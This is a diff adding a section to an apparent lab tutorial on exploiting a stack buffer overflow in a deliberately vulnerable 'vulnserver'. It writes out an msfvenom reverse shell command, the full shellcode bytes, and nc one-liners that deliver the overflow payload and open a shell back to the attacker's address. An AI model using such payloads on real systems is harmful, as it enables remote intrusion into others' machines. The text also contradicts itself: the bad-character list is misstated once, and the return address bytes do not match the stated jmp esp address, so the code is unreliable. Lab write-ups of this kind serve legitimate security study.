@@ -628,4 +628,75 @@ We can see on the server side by using EDB that there is several chars that not 
 ![bo-032.png](/assets/images/bo-032.png)
 **Figure 32** Bad chars.
 
-So, in that case the bad chars are `\x09\x0a`, so we need to a void these chars on our return address and on the reverse shell.
+So, in that case the bad chars are `\x09\x0a`, so we need to a void these chars on our return address and on the reverse shell. I also like to add `\x00` for just in case that is bad char too, so, on our case the bad chars will be `\x09\x0a\x00`.
+
+Now let's use `msfvenom` for create the reverse shell code in hex value, this reverse shell wil be use later on our code.
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.126.32 lport=443 -b"\x09\x0a\x00" -f py -v shellcode
+```
+
+In my case I used x86 tcp reverse shell for linux, my local host is 192.168.126.32 and my local port is 443, the bad chars are `\x90\x0a\x00` and also I want that output to be in python format with variable named shellcode.
+
+![bo-033.png](/assets/images/bo-033.png)
+**Figure 33** Msfvenom output.
+
+So, this is the shellcode we going to execute against out target vulnserver, now we end up with the following code, which contain the `B` which should overwrite the EIP, then instead the `D` I insert `\x90` as we saw erliear for NOP byte which going to be the SLAD for our reverse shell code, we also check the lenght of the code and use it to calculate the last 100 chars.
+
+```bash
+└─$ python2 -c "print len(str('\xbd\x48\xeb\xf5\x4c\xda\xd0\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x12\x31\x68\x12\x83\xc0\x04\x03\x20\xe5\x17\xb9\x81\x22\x20\xa1\xb2\x97\x9c\x4c\x36\x91\xc2\x21\x50\x6c\x84\xd1\xc5\xde\xba\x18\x75\x57\xbc\x5b\x1d\xa8\x96\xe2\xfd\x40\xe5\x1a\xfc\x2b\x60\xfb\x4e\x2d\x23\xad\xfd\x01\xc0\xc4\xe0\xab\x47\x84\x8a\x5d\x67\x5a\x22\xca\x58\xb3\xd0\x63\x2e\x28\x46\x27\xb9\x4e\xd6\xcc\x74\x10'))"
+95
+└─$ echo $(python2 -c "print 'HELP'+'A'*68+'BBBB'+'\x90'*32+'\xbd\x48\xeb\xf5\x4c\xda\xd0\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x12\x31\x68\x12\x83\xc0\x04\x03\x20\xe5\x17\xb9\x81\x22\x20\xa1\xb2\x97\x9c\x4c\x36\x91\xc2\x21\x50\x6c\x84\xd1\xc5\xde\xba\x18\x75\x57\xbc\x5b\x1d\xa8\x96\xe2\xfd\x40\xe5\x1a\xfc\x2b\x60\xfb\x4e\x2d\x23\xad\xfd\x01\xc0\xc4\xe0\xab\x47\x84\x8a\x5d\x67\x5a\x22\xca\x58\xb3\xd0\x63\x2e\x28\x46\x27\xb9\x4e\xd6\xcc\x74\x10'+'\x90'*(100-95)")|nc 192.168.126.36 8080
+```
+
+You can see that after the shell code we add more bytes for make it longer till 100 chars, since the shell code length is 95, we add more NOP bytes which is 5 on that case to make that input code long with more 100 chars after we run it we can see that we get the same segmentation fault which great.
+
+![bo-034.png](/assets/images/bo-034.png)
+**Figure 34** Segmentation fault.
+
+Now, after all set was done, we need to find the return address, that address should boing out to our malicious code, if we check on the registers and follow up the ESP we can see that on the crash it point out to the SLAD, which is great! (you need to select the ESP and click on "follow in dump")
+
+![bo-035.png](/assets/images/bo-035.png)
+**Figure 35** Follow ESP dump.
+
+Since we know that the ESP is point on the crash point directly to out SLAD, we need to find return address that will point back to the ESP, on assembly the command for jump into the stack is `jmp esp`,  which is what we are looking for, on EDB we can use Plugins>OpcodeSearcher>Opcode Search, that window can help us to search on vulnserver location address for the command `jmp esp`. Just remember that it best idea to search what you need directly on the vulnerable program and not the other modules.
+
+On the right side we select Jump Equivalent `ESP->EIP`, then select on the left block code and press `Find`, then the EDB search for any address that contain some command that involved any `ESP` on the selected block, on my case I have select the first one which found nothing.
+
+![bo-036.png](/assets/images/bo-036.png)
+**Figure 36** Search for ESP command.
+
+After several search I have found one block directly from vulnserver that contain `jmp esp` command which is great, that command have the address of `0x0804b0cb`.
+
+![bo-037.png](/assets/images/bo-037.png)
+**Figure 37** Our return address for EIP.
+
+So now our full code contain the EIP which is `\xcb\xa0\x04\x08`, and we end up with the following code block that we should run against out target:
+
+```
+echo $(python2 -c "print 'HELP'+'A'*68+'\xcb\xa0\x04\x08'+'\x90'*32+'\xbd\x48\xeb\xf5\x4c\xda\xd0\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x12\x31\x68\x12\x83\xc0\x04\x03\x20\xe5\x17\xb9\x81\x22\x20\xa1\xb2\x97\x9c\x4c\x36\x91\xc2\x21\x50\x6c\x84\xd1\xc5\xde\xba\x18\x75\x57\xbc\x5b\x1d\xa8\x96\xe2\xfd\x40\xe5\x1a\xfc\x2b\x60\xfb\x4e\x2d\x23\xad\xfd\x01\xc0\xc4\xe0\xab\x47\x84\x8a\x5d\x67\x5a\x22\xca\x58\xb3\xd0\x63\x2e\x28\x46\x27\xb9\x4e\xd6\xcc\x74\x10'+'\x90'*(100-95)")|nc 192.168.126.36 8080
+```
+
+On EDB we start the vulnserver over, and this time we make some breakpoint to see if the return address will forward the instruction to our code, we need to click on Plugins>BreakpointMaster>Breakpoints, then we need to insert out break point which is `0x0804b0cb`, just click on add and addup the address.
+
+![bo-038.png](/assets/images/bo-038.png)
+**Figure 38** Adding breakpoint.
+
+Then run the code against the vulnserver and it should stop on that breakpoint, after it stop we can click on the `step into` icon which is going just one step forward and see if it point to our stack.
+
+![bo-039.png](/assets/images/bo-039.png)
+**Figure 39** Running the code.
+
+![bo-040.png](/assets/images/bo-040.png)
+**Figure 40** Stopping on breakpoint.
+
+You can see that it point to `jmp esp`, so now if we click on the step into icon, we can see that he going to our NOP bytes directly from the ESP.
+
+![bo-041.png](/assets/images/bo-041.png)
+**Figure 41** Step into NOP.
+
+If all working right, we should get reverse shell if we press on run again. Only then we can run that without EDB and see if we get a shell back.
+
+![bo-042.gif](/assets/images/bo-042.gif)
+**Figure 42** Reverse shell from vulnserver.
+
+So, now we have reverse shell directly from the vulnserver!
